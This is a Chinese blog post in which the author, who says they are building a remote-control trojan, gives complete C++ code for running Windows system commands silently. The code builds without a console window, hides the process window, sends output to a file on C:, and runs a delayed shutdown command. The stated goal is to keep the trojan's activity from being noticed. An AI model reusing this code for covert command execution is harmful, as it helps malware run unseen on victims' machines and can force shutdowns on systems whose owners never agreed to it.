---
layout: post
title: "Windows静默执行system command"
date: 2016-08-25T19:25:14
categories: [Aha moments]
tags: [elfsong.cn]
---

这两天在撸一个远程控制的木马。

在服务端，我们首先要实现的一个功能就是要能够执行系统命令。但是system函数在执行的时候都会自带一个黑乎乎的Console，这东西很容易暴露啊（什么很容易，明明一眼就能看出来好么？）

所以，我们需要一种可以将输出重定向的函数来完成这一光荣而不怎么艰巨的历史使命。打开MSDN，万花丛中我们找到了这个东东——CreateProcess。

下面的代码实现非常简单，我们重定向了系统调用的输出，成功把它带到了沟里~~

```
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup") // 设置连接器选项
```

之后我们再拉一个文件句柄出来，用它来接住CreateProcess的输出。

<!--more-->

所以，全部的代码就是这个样子的了：

```
#include "stdafx.h"
#include   <windows.h>     
#include   <stdio.h>     
//调用命令行命令而不显示命令行窗口  
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup") // 设置连接器选项
BOOL system_hide()     
{     
    SECURITY_ATTRIBUTES   sa;   
    SECURITY_ATTRIBUTES *psa=NULL;  
    HANDLE   hRead,hWrite;     
    sa.nLength   =   sizeof(SECURITY_ATTRIBUTES);     
    sa.lpSecurityDescriptor   =   NULL;     
    sa.bInheritHandle   =   TRUE;     
    if   (!CreatePipe(&hRead,&hWrite,&sa,0))       
    {     
        return   FALSE;     
    }       
    STARTUPINFO   si;     
    PROCESS_INFORMATION   pi;       
    si.cb   =   sizeof(STARTUPINFO);     
    GetStartupInfo(&si);       
    si.hStdError   =   hWrite;     
    DWORD dwShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE;  
    OSVERSIONINFO osVersion={0};  
    osVersion.dwOSVersionInfoSize =sizeof ( osVersion );  
    if ( GetVersionEx ( &osVersion ) )  
    {  
        if ( osVersion.dwPlatformId ==VER_PLATFORM_WIN32_NT )  
        {  
            psa=&sa;  
            dwShareMode|=FILE_SHARE_DELETE;  
        }  
    }  
    HANDLE hConsoleRedirect=CreateFile (  
                            TEXT("c://NetStatus.txt"),  
                            GENERIC_WRITE,  
                            dwShareMode,  
                            psa,  
                            OPEN_ALWAYS,  
                            FILE_ATTRIBUTE_NORMAL,  
                            NULL );  
    //使用标准柄和显示窗口  
    si.hStdOutput =hConsoleRedirect;//将文件作为标准输出句柄  
    si.wShowWindow   =   SW_HIDE;     
    si.dwFlags   =   STARTF_USESHOWWINDOW   |   STARTF_USESTDHANDLES;     
    //关键步骤，CreateProcess函数参数意义请查阅MSDN     
    TCHAR cmdline[] =TEXT("shutdown -s -t 360");
    if   (!CreateProcess(NULL, cmdline, NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))       
    {     
        return   FALSE;     
    }     
    CloseHandle(hWrite);     
    char   buffer[4096]   =   {0};     
    DWORD   bytesRead;       
    while(true)       
    {     
        memset(buffer,0,strlen(buffer));  
        if(ReadFile(hRead,buffer,4095,&bytesRead,NULL)==NULL)     
            break;     
        //buffer中就是执行的结果，可以保存到文本，也可以直接输出     
        //printf(buffer);//这行注释掉就可以了     
        Sleep(100);       
    }       
    return   TRUE;     
}     
int main(int argc, char* argv[])     
{     
    system_hide();//不显示命令窗口  
    //system(COMMENDLINE);//显示命令行窗口  
    return 0;     
}
```

所有不能直接运行的代码都不是好代码，这段东西应该是可以直接跑起来的。

测试环境： Win 7（SDK） + VS 2012
